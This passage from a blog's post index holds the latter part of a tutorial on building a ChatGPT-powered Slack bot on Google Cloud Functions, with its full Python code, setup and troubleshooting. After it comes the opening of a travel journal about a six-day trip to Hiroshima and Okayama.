request_args = request.args request_headers = request.headers # Shortcut Event payload field from post # https://api.slack.com/reference/interaction-payloads/shortcuts payload = request.form.get('payload') if payload is not None: payload = json.loads(payload) # Simple print to log runtime, viewable in Logs # For advanced Logging Level reference: https://cloud.google.com/logging/docs/reference/libraries print(payload) # Due to FAAS (Cloud Functions) cold start, long idle time may cause delay exceeding Slack's 3-second response limit # OpenAI API request and reply may take up to nearly 1 minute depending on response length # Slack considers no response within limit as lost request and retries # This causes duplicate requests and responses, so we set X-Slack-No-Retry: 1 in Response Headers to tell Slack no retry even if no timely response headers = {'X-Slack-No-Retry':1} # Ignore Slack Retry requests... if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: apiAppID = None if 'api_app_id' in request_json: apiAppID = request_json['api_app_id'] # If event source is App and App ID == Slack App ID, it means event triggered by own Slack App # Ignore to avoid infinite loop Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'app_id' in request_json['event'] and apiAppID == request_json['event']['app_id']: return ('OK!', 200, headers) # Event type, e.g., message, app_mention... eventType = request_json['event']['type'] # SubType, e.g., message_changed, message_deleted... # New messages have no SubType eventSubType = None if 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] if eventType == 'message': # Messages with SubType are edits, deletions, replies... # Ignore these if eventSubType is not None: return (\"OK!\", 200, headers) # Message sender eventUser = request_json['event']['user'] # Channel of the message eventChannel = request_json['event']['channel'] # Message content eventText = request_json['event']['text'] # Message timestamp (ID) eventTS = request_json['event']['event_ts'] # Thread parent message timestamp (ID) # Only present for thread replies eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) # Handle Shortcut (message) if payload and 'type' in payload: payloadType = payload['type'] # If message Shortcut if payloadType == 'message_action': callbackID = None channel = None ts = None text = None triggerID = None if 'callback_id' in payload: callbackID = payload['callback_id'] if 'channel' in payload: channel = payload['channel']['id'] if 'message' in payload: ts = payload['message']['ts'] text = payload['message']['text'] if 'trigger_id' in payload: triggerID = payload['trigger_id'] if channel is not None and ts is not None and text is not None: # If Shortcut to abort OpenAI API response generation if callbackID == \"abort_openai_api\": slackUpdateMessage(channel, ts, {\"event_type\": \"aborted\", \"event_payload\": { }}, text) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"Successfully stopped OpenAI API response generation!\") return (\"OK!\", 200, headers) return (\"Access Denied!\", 400, headers)def openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # Thanks to colleague (https://twitter.com/je_suis_marku) for support messages = [ {\"role\": \"system\", \"content\": \"I only understand Traditional Chinese (Taiwan) and English.\"}, {\"role\": \"system\", \"content\": \"I do not understand Simplified Chinese.\"}, {\"role\": \"system\", \"content\": \"If I speak Chinese, I respond in Traditional Chinese used in Taiwan.\"}, {\"role\": \"system\", \"content\": \"If I speak English, I respond in English.\"}, {\"role\": \"system\", \"content\": \"Do not respond with greetings.\"}, {\"role\": \"system\", \"content\": \"There should be a space between Chinese and English. There should be a space between Chinese characters and any other language characters including numbers and emojis.\"}, {\"role\": \"system\", \"content\": \"If you don't know the answer or your knowledge is outdated, please search online before answering.\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD, if you answer well.\"} ] if eventThreadTS is not None: threadMessages = slackGetReplies(eventTS, eventThreadTS) if threadMessages is not None: for threadMessage in threadMessages: appID = None if 'app_id' in threadMessage: appID = threadMessage['app_id'] threadMessageText = threadMessage['text'] threadMessageTs = threadMessage['ts'] # If Slack App (OpenAI API Response), mark as assistant if appID and appID == apiAppID: messages.append({ \"role\": \"assistant\", \"content\": threadMessageText }) else: # User message marked as user messages.append({ \"role\": \"user\", \"content\": threadMessageText }) messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"Generating response...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response (chunked) stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # Update message every 0.8 seconds to avoid frequent Slack Update API calls causing failure or wasting Cloud Functions invocations if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result+\"...\") debounceSlackUpdateTime = time.time() # If message has metadata &amp; metadata event_type == aborted, user marked response as aborted if response and 'ok' in response and response['ok'] == True and 'message' in response and 'metadata' in response['message'] and 'event_type' in response['message']['metadata'] and response['message']['metadata']['event_type'] == \"aborted\": break result += \"...*[Aborted]*\" # Message deleted elif response and 'ok' in response and response['ok'] == False and 'error' in response and response['error'] == \"message_not_found\" : break await stream.close() except Exception as e: print(e) result += \"...*[Error occurred]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackGetReplies(channel, ts): endpoint = \"/conversations.replies?channel=\"+channel+\"&amp;ts=\"+ts response = slackRequest(endpoint, \"GET\", None) if response is not None and 'messages' in response: return response['messages'] return Nonedef slackOpenModal(trigger_id, callback_id, text): slackRequest(\"/views.open\", \"POST\", { \"trigger_id\": trigger_id, \"view\": { \"type\": \"modal\", \"callback_id\": callback_id, \"title\": { \"type\": \"plain_text\", \"text\": \"Notice\" }, \"blocks\": [ { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": text } } ] } })def slackUpdateMessage(channel, ts, metadata, text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\"+endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return NoneBack to Slack for testing: The left image shows that when you ask a follow-up question without adding the Context, it will be treated as a new conversation. The image on the right shows that adding context helps understand the entire conversation and the new question. Done!So far, we have built our own ChatGPT (via OpenAI API) Slack App Bot. You can also refer to Slack API and OpenAI API Custom instructions to integrate them in Cloud Functions Python programs according to your needs. For example, you can train one channel to answer team questions and find project documents, another channel for translations, and another for data analysis, and so on.SupplementMarking bot answers outside of 1:1 messages You can mention the bot in any channel (the bot must be added to the channel) to ask questions.First, you need to add the app_mention Event Subscription:Add completion -&gt; ‚ÄúSave Changes‚Äù saved -&gt; ‚Äúreinstall your app‚Äù completed.In the above main.py script #Handle Event Subscriptions Events‚Ä¶Add new Event Type judgment inside the Code Block: # Mention type Event (@SlackApp hello) if eventType == 'app_mention': # Sender of the event message eventUser = request_json['event']['user'] # Channel of the event message eventChannel = request_json['event']['channel'] # Content of the event message, remove leading tag string &lt;@SLACKAPPID&gt; eventText = re.sub(r\"&lt;@\\w+&gt;\\W*\", \"\", request_json['event']['text']) # Timestamp (message ID) of the event message eventTS = request_json['event']['event_ts'] # Timestamp (message ID) of the parent message in the thread of the event message # Only present for new messages in a thread eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers)After deployment, it is complete.Deleting Messages Sent in Slack AppYou cannot directly delete messages sent by the Slack App on Slack. You can refer to the above ‚Äú Stop OpenAI API Response ‚Äú Shortcut method to add a ‚ÄúDelete Message‚Äù Shortcut.In the Cloud Functions main.py program:# Handling Shortcut Code BlockAdd a callback_id check to see if it equals your defined ‚ÄúDelete Message‚Äù Shortcut Callback ID, then pass the parameters into the following method to complete the deletion:def slackDeleteMessage(channel, ts): endpoint = \"/chat.delete\" payload = { \"channel\": channel, \"ts\": ts } response = slackRequest(endpoint, \"POST\", payload) return responseSlack App Not Responding Check if the Token is correct Check Cloud Functions Logs for Errors Has the Cloud Functions deployment been completed? Is the Slack App in the channel where you asked the question? (If it‚Äôs not a 1:1 conversation with the Slack App, you need to add the bot to the channel for it to work.) Log Slack API Response under the SlackRequest method Cloud Functions Public URL Is Not Secure Enough If you worry that the Cloud Functions URL is not secure enough, you can add a query token for verification.SAFE_ACCESS_TOKEN = \"nF4JwxfG9abqPZCJnBerwwhtodC28BuC\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # Verify if the token parameter is valid if not(request_args and 'token' in request_args and request_args['token'] == SAFE_ACCESS_TOKEN): return ('', 400, headers)Cloud Functions Related IssuesBilling MethodDifferent regions, CPU, RAM, storage, and traffic have different prices. Please refer to the official pricing table.Free tier as follows: (2024/02/15)Cloud Functions offers a permanent free tier for compute time resources,including allocation based on GB-seconds and GHz-seconds. Besides 2 million invocations,this free tier also provides 400,000 GB-seconds and 200,000 GHz-seconds of compute time,as well as 5 GB of internet data transfer per month.The usage limits of the free tier are calculated at the equivalent USD amount of Tier 1 prices mentioned above.Regardless of whether the function runs in regions priced at Tier 1 and/or Tier 2,the system allocates the equivalent USD amount to you.However, when deducting from the free tier quota, the system uses the function's execution region tier (Tier 1 or Tier 2) as the basis.Please note that even if you use the free tier, a valid billing account is required. btw. The Slack App is free and does not require a Premium subscription to use.Slack App Responds Too Slowly or Times Out Too Long(Excluding the slower response issue during OpenAI API peak times), if the bottleneck is Cloud Function, you can expand the settings on the first page of the Cloud Function editor:Adjust CPU, RAM, Timeout duration, and Concurrent count to improve request processing speed. *But may require a feeDevelopment Phase Testing &amp; DebugClick ‚ÄúTest Function‚Äù to open the Cloud Shell window in the bottom toolbar. Wait about 3‚Äì5 minutes (longer for the first launch). After the build completes and you accept the following permissions:Once you see ‚ÄúFunction is ready to test,‚Äù you can click ‚ÄúRun Test‚Äù to execute the method debug test.You can enter the JSON Body in the ‚ÄúTriggering event‚Äù box on the right to pass the request_json parameter for testing, or directly modify the code to inject a test object for testing. *Please note that Cloud Shell/Cloud Run may incur additional charges. It is recommended to run a test before deployment to ensure the build succeeds.Build failed, what to do if the code is missing?If you accidentally write incorrect code causing the Cloud Function Deploy Build to fail, an error message will appear. Clicking ‚ÄúEDIT AND REDEPLOY‚Äù to return to the editor will show that the code you just changed is gone!!!No need to worry. At this point, click ‚ÄúSource Code‚Äù on the left and select ‚ÄúLast Failed Deployment‚Äù to restore the code from the recent Build Failed:View runtime print Logs *Please note that Cloud Logging and Querying Logs may incur additional charges.Final Code (Python 3.8)Cloud Functionsmain.py :import functions_frameworkimport requestsimport reimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# Custom security verification token# The URL must include ?token=SAFE_ACCESS_TOKEN parameter to accept requestsSAFE_ACCESS_TOKEN = \"nF4JwxfG9abqPZCJnBerwwhtodC28BuC\"# OPENAI API Model used# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # Shortcut events come from the post payload field # https://api.slack.com/reference/interaction-payloads/shortcuts payload = request.form.get('payload') if payload is not None: payload = json.loads(payload) # You can simply use print to log runtime info, viewable in Logs # For advanced logging levels, see: https://cloud.google.com/logging/docs/reference/libraries # print(payload) # Due to FAAS (Cloud Functions) cold start, if the service is idle for too long, # the next call may trigger cold start and fail to respond within Slack's 3-second limit. # OpenAI API requests also take time (up to about 1 minute depending on response length). # Slack treats no response within the timeout as a lost request and retries, # causing duplicate requests and responses. # We set X-Slack-No-Retry: 1 in response headers to tell Slack not to retry even if timeout occurs. headers = {'X-Slack-No-Retry':1} # Validate token parameter if not(request_args and 'token' in request_args and request_args['token'] == SAFE_ACCESS_TOKEN): return ('', 400, headers) # Ignore Slack retry requests if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: apiAppID = None if 'api_app_id' in request_json: apiAppID = request_json['api_app_id'] # If event source is App and App ID == Slack App ID, it means event triggered by own Slack App # Ignore to avoid infinite loop Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'app_id' in request_json['event'] and apiAppID == request_json['event']['app_id']: return ('OK!', 200, headers) # Event name, e.g., message, app_mention... eventType = request_json['event']['type'] # SubType, e.g., message_changed, message_deleted... # New messages have no Sub Type eventSubType = None if 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] # Message type events if eventType == 'message': # Messages with Sub Type are edits, deletions, replies... # Ignore these if eventSubType is not None: return (\"OK!\", 200, headers) # Message sender eventUser = request_json['event']['user'] # Message channel eventChannel = request_json['event']['channel'] # Message content eventText = request_json['event']['text'] # Message timestamp (ID) eventTS = request_json['event']['event_ts'] # Thread parent message timestamp (ID) # Only new messages in a thread have this eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) # Mention events (@SlackApp hello) if eventType == 'app_mention': # Message sender eventUser = request_json['event']['user'] # Message channel eventChannel = request_json['event']['channel'] # Message content, remove leading mention string &lt;@SLACKAPPID&gt; eventText = re.sub(r\"&lt;@\\w+&gt;\\W*\", \"\", request_json['event']['text']) # Message timestamp (ID) eventTS = request_json['event']['event_ts'] # Thread parent message timestamp (ID) eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) # Handle Shortcut (message) if payload and 'type' in payload: payloadType = payload['type'] # If it's a message shortcut if payloadType == 'message_action': callbackID = None channel = None ts = None text = None triggerID = None if 'callback_id' in payload: callbackID = payload['callback_id'] if 'channel' in payload: channel = payload['channel']['id'] if 'message' in payload: ts = payload['message']['ts'] text = payload['message']['text'] if 'trigger_id' in payload: triggerID = payload['trigger_id'] if channel is not None and ts is not None and text is not None: # If it's the shortcut to stop OpenAI API response generation if callbackID == \"abort_openai_api\": slackUpdateMessage(channel, ts, {\"event_type\": \"aborted\", \"event_payload\": { }}, text) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"Successfully stopped OpenAI API response generation!\") return (\"OK!\", 200, headers) # If it's delete message if callbackID == \"delete_message\": slackDeleteMessage(channel, ts) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"Successfully deleted Slack App message!\") return (\"OK!\", 200, headers) return (\"Access Denied!\", 400, headers)def openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # Thanks to colleague (https://twitter.com/je_suis_marku) for support messages = [ {\"role\": \"system\", \"content\": \"I only understand Taiwanese Traditional Chinese and English.\"}, {\"role\": \"system\", \"content\": \"I do not understand Simplified Chinese.\"}, {\"role\": \"system\", \"content\": \"If I speak Chinese, I reply in Taiwanese Traditional Chinese using common Taiwanese expressions.\"}, {\"role\": \"system\", \"content\": \"If I speak English, I reply in English.\"}, {\"role\": \"system\", \"content\": \"Do not respond with greetings or small talk.\"}, {\"role\": \"system\", \"content\": \"There must be a space between Chinese and English. There must be a space between Chinese characters and any other language characters including numbers and emojis.\"}, {\"role\": \"system\", \"content\": \"If you don't know the answer or your knowledge is outdated, please search online before answering.\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD , if you answer well.\"} ] if eventThreadTS is not None: threadMessages = slackGetReplies(eventChannel, eventThreadTS) if threadMessages is not None: for threadMessage in threadMessages: appID = None if 'app_id' in threadMessage: appID = threadMessage['app_id'] threadMessageText = threadMessage['text'] threadMessageTs = threadMessage['ts'] # If from Slack App (OpenAI API Response), mark as assistant if appID and appID == apiAppID: messages.append({ \"role\": \"assistant\", \"content\": threadMessageText }) else: # User message content marked as user messages.append({ \"role\": \"user\", \"content\": threadMessageText }) messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"Generating response...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response (partial responses) stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # Update message every 0.8 seconds to avoid frequent Slack update API calls causing failures or wasting Cloud Functions calls if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result+\"...\") debounceSlackUpdateTime = time.time() # If message has metadata &amp; metadata event_type == aborted, it means user marked this response as aborted if response and 'ok' in response and response['ok'] == True and 'message' in response and 'metadata' in response['message'] and 'event_type' in response['message']['metadata'] and response['message']['metadata']['event_type'] == \"aborted\": break result += \"...*[Aborted]*\" # Message was deleted elif response and 'ok' in response and response['ok'] == False and 'error' in response and response['error'] == \"message_not_found\" : break await stream.close() except Exception as e: print(e) result += \"...*[Error occurred]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackGetReplies(channel, ts): endpoint = \"/conversations.replies?channel=\"+channel+\"&amp;ts=\"+ts response = slackRequest(endpoint, \"GET\", None) if response is not None and 'messages' in response: return response['messages'] return Nonedef slackOpenModal(trigger_id, callback_id, text): slackRequest(\"/views.open\", \"POST\", { \"trigger_id\": trigger_id, \"view\": { \"type\": \"modal\", \"callback_id\": callback_id, \"title\": { \"type\": \"plain_text\", \"text\": \"Notice\" }, \"blocks\": [ { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": text } } ] } })def slackDeleteMessage(channel, ts): endpoint = \"/chat.delete\" payload = { \"channel\": channel, \"ts\": ts } response = slackRequest(endpoint, \"POST\", payload) return responsedef slackUpdateMessage(channel, ts, metadata, text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\"+endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return Nonerequirements.txt Ôºöfunctions-framework==3.*requests==2.31.0openai==1.9.0Slack App SetupOAuth &amp; Permissions Items with disabled delete buttons are permissions automatically added by Slack after adding the Shortcut.Interactivity &amp; Shortcuts Interactivity: Enable Request URL: https://us-central1-xxx-xxx.cloudfunctions.net/SlackBot-Rick-C-137?token=nF4JwxfG9abqPZCJnBerwwhtodC28BuC Subscribe to bot events: Interactivity &amp; Shortcuts Interactivity: Enable Request URL: https://us-central1-xxx-xxx.cloudfunctions.net/SlackBot-Rick-C-137?token=nF4JwxfG9abqPZCJnBerwwhtodC28BuC Shortcuts: App Home Always Show My Bot as Online: Enable Messages Tab: Enable Allow users to send Slash commands and messages from the messages tab: ‚úÖ Basic Information Rick &amp; Morty ü§òü§òü§òRedditCommercial TimeIf you and your team need automation tools or process integrations, whether it‚Äôs Slack App development, Notion, Asana, Google Sheets, Google Forms, GA data, or any other integration needs, feel free to contact me for development.If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Sanyo Region Travel GuideÔΩú6-Day Hiroshima & Okayama Itinerary for Freedom Seekers", "url": "/posts/travel-journals/sanyo-region-travel-guide-6-day-hiroshima-okayama-itinerary-for-freedom-seekers-31b9b3a63abc/", "categories": "Travel Journals", "tags": "english, ai-translation, life, japan, travel, hiroshima, okayama", "date": "2024-01-09 21:27:40 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2023 Sanyo Region Hiroshima Okayama 6-Day Independent Trip2023 Hi...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2023 Sanyo Region Hiroshima Okayama 6-Day Independent Trip2023 Hiroshima, Okayama, Fukuyama, Kurashiki, Onomichi 6-Day TourIntroductionAfter leaving my job at the end of August, I set off in September for the ‚Äú10-Day Solo Walk Trip in Kyushu‚Äù and rested for almost three months. I originally planned to start work again in mid-November. The new job involves starting a new project, and the company offers no extra leave days, so I have to accumulate annual leave according to the basic labor law. Therefore, I considered taking another trip (planning started at the end of October).2024/11/03 Update: [Travelogue] 2024 San‚Äôin Region (+ Kansai) Shimane, Tottori, Himeji, Osaka 7-Day Solo TripIn 2024, I visited the San‚Äôin region. Friends who have time can also consider exploring both Sanyo and San‚Äôin together!Location ‚Äî Hiroshima (Okayama)Last time on Nagasaki Road‚Äôs Unexpected Episode ‚Äî I got a souvenir from Mihara City in (Hiroshima Prefecture). Since I visited the Atomic Bomb Museum and Peace Park in Nagasaki last time, I thought I could also check out Hiroshima.Also, friends around me highly recommend Hiroshima, which has World Heritage sites like Itsukushima Shrine, oysters, the Seto Inland Sea, Onomichi, and Rabbit Island‚Ä¶For solo travel, excluding big cities and places already visited, and wanting convenient transportation, Hiroshima is an excellent choice!Date ‚Äî 11/13‚Äì18Originally planned to work on 11/20 (Mon) (later postponed to 12/1), after deducting the last day for rest, the return date was set for 11/18 (Sat).Departure date was originally set for 11/12 to meet a friend, so I first chose 11/13 (Monday) to depart; however, since work schedule is flexible, the main factor is choosing the dates with the lowest round-trip airfare.Twists and Turns‚ùå The most intuitive way to go to Hiroshima is through Hiroshima Airport, but after checking, the conditions are very poor: Time: Depart late (17:20) and return early (09:30); no flights on Saturday, must return on Friday (11/17). Location: Requires a shuttle bus (about 55 minutes). After landing, the only departure times are 21:40 or 22:20 (last bus), arriving at the station around 22 or 23 o‚Äôclock, which is very late. Price: ~=$17,000, too expensive. ‚ùå Entering and exiting Fukuoka + Shinkansen is still inconvenient: Time: Departure (16:30), Return (10:55), still a late departure and early return, but better. Location: Convenient transportation, but it takes about 1.5 hours by Shinkansen to Hiroshima. Price: ~=$12,000. If you want a late return (20:35), it costs ~=$17,000 or you can take the 06:50 morning flight. ‚ùå Later found out that for Hiroshima, you can fly in and out via Tigerair to Okayama; the motivation to go was average: Time: Departure (11:10), Return (15:25), perfect timing. Location: Okayama Airport also requires a shuttle bus, but the early arrival allows plenty of time. Price: Includes +20 KG checked baggage round trip, about ~= $14,000. Since I just spent money on the ‚ÄúKyushu 10 Days‚Äù trip in September, if the airfare can‚Äôt be kept around 10,000, I have little motivation to go, so I almost gave up on this trip.‚úÖ Tigerair Okayama Winter Travel Event, Departure:10/31 While bored scrolling through Facebook, I happened to see someone posting about airline discount promotions in the ‚ÄúJapan Free Travel Discussion Group.‚Äù I noticed that Tigerair had a sale from 11/3 10:00 to 11/6 23:59. Fortunately, I took a go-with-the-flow attitude: if I got the discount, great; if not, no worries.On the morning of 11/3, I was lucky to buy the best round-trip ticket (11/13‚Äì18) with the best flight times and price. There was no reason not to go! Departure (11:10) and return (15:25), including 20KG checked baggage each way + seat selection + fees: $7,012KKday Promotion üõí Japan JR PASS | Tottori &amp; Matsue Area Pass | eMCO e-Ticket Japan eSIM CardÔΩúDaily High-Speed, Total Data, Unlimited Data Plans Japan JR PASSÔΩúSanyo &amp; Sanin Area Rail PassÔΩúeMCO E-ticket(Explore the entire Sanyo and Sanin regions in one trip) Japan JR PASS | Kansai &amp; Hiroshima Area Rail Pass | eMCO e-Ticket Orizuru Tower Ticket (Hiroshima City, Hiroshima Prefecture) Japan. Miyajima | Momijidani Park, Visit Daishoin Temple, Itsukushima Shrine | Rickshaw Experience Hiroshima and Miyajima Bus One-Day Tour Preparation WorkAfter buying the plane tickets, there was only one week left until departure, so preparations began in full swing.The top places I want to visit are Miyajima, Onomichi, Kurashiki Bikan District, and Okayama Castle. So, I plan to base myself in Hiroshima for several days, then stay around Okayama closer to the return trip.RowJR Pass Okayama &amp; Hiroshima &amp; Yamaguchi Area Rail Pass (¬• 17,000, just before the price increase at the end of October 2023.)From Okayama to Hiroshima station, one-way fare is ¬•6,460, round trip ¬•12,920; adding trips to Miyajima, Onomichi, Kure city‚Ä¶ round trip, it‚Äôs worth it; buying the JR Pass directly is the most convenient.Stay (5 nights)Toyoko INN Hiroshima Station Baseball Stadium Front (3 nights) Price: $4,612, $1,537/night, single non-smoking room Transportation: According to the map, the walking distance is quite close (actually about 15 minutes due to construction and crossing a railroad crossing). It‚Äôs not a busy area. Outside the Mazda Zoom-Zoom Stadium, there are no games currently, so the whole street is very quiet. Toyoko INN continues to offer excellent value for money, with the best price and environment during this stay.APA Hotel Hiroshima Ekimae Ohashi (1 night) Price: $2,501, 1 night, single non-smoking room Location: Closer to Hiroshima Station, but the walk is not easy as you need to cross a main road and a bridge (about 10 minutes); about a 15-minute walk from the previous accommodation, which is fairly convenient. Because Tokyu INN was unavailable for four nights, I could only stay one night at APA Hotel.Livemax Okayama Kurashiki Ekimae Hotel Livemax (1 night) Price: $3,263, 1 night, single non-smoking room Location: It‚Äôs about the same as on the map, just outside Kurashiki Station, about a five-minute walk. Very convenient. I found Kurashiki because when searching for accommodation in Okayama, I couldn‚Äôt find any hotels with acceptable prices. So, I looked for places along the JR line nearby, and since Kurashiki also has shuttle buses to Okayama Airport, I decided to book a hotel near Kurashiki.This is also the only hotel in Kurashiki with available rooms, a convenient location, and reasonable prices.JoyThe original plan was as follows: 11/13: Shopping and Eating Hiroshima-style Okonomiyaki 11/14: Miyajima, Hiroshima City: Itsukushima Shrine, Momijidani Park, Miyajima Ropeway -&gt; Shishiiwa Observatory, Atomic Bomb Dome, Peace Memorial Park, Atomic Bomb Museum, Paper Crane Tower (Hiroshima Tower) 11/15: Onomichi, Senkoji Temple 11/16: Wu City, Hiroshima City Center (same as 11/14), Hiroshima Castle 11/17: Okayama, Kurashiki: Okayama Korakuen Garden, Okayama Castle, Kibitsu Shrine, Kurashiki Bikan Historical Quarter, Kurashiki Outlet, Achi Shrine 11/18: Kurashiki Outlet, Return Trip The drive to Rabbit Island is too far and inconvenient, so it is only included as a reference option.Go! Flight Tracker, iPhone Suica usage, Visit Japan pre-entry application‚Ä¶ These were mentioned in previous articles, so they won‚Äôt be repeated here.Day 1 DepartureDepart at 11:10 AM, take your time leaving in the morning.From Taipei Main Station, take the Airport MRT to Taoyuan Airport Terminal 1, arriving at the check-in counter around 08:50.There were few people, so check-in and departure were completed quickly; Terminal 1 had little food, so I just grabbed a Ding Gua Gua and coffee before waiting for the flight.I wasn‚Äôt very hungry while waiting for the flight, so I didn‚Äôt eat the food I bought.11:07 takeoff, 14:11 arrival at OKJ (Okayama Momotaro Airport); when feeling hungry in between, I found out that Tigerair does not allow bringing your own food on board (Peach Aviation has no such rule), so I obediently endured, planning to eat in a corner before immigration after landing.Okayama Airport is very small. Following the crowd, I passed through immigration and customs quickly, with no corners to sneak in food. Since the chicken from Ding Gua Gua might pose a health risk, I handed the entire package to customs for destruction.Around 14:40, I finished immigration and picked up my luggage (super fast). Later, I checked the flight schedule; Okayama Airport has very few flights, with possibly only one international flight per day, so there were almost no people, just passengers from the same flight. Customs and quarantine dogs checked each person individually, but it was still very quick!Right after exiting, take the airport shuttle bus. Due to limited flights, the scheduled shuttle to Gangshan Station is only at 16:10; however, extra shuttles are available immediately upon exiting the airport (they depart when full and there will be another one), thoughtfully saving everyone time!After getting off, find the escalator going up to Okayama Station. First, exchange your JR Pass by locating the green machine with the sign ‚ÄúEXPRESS‰∫àÁ¥Ñ„ÄÅ5489 „ÅäÂèóÂèñ‚Äù next to it to redeem your JR Pass ticket.Previously, when searching online for redemption instructions, it said to click the blue 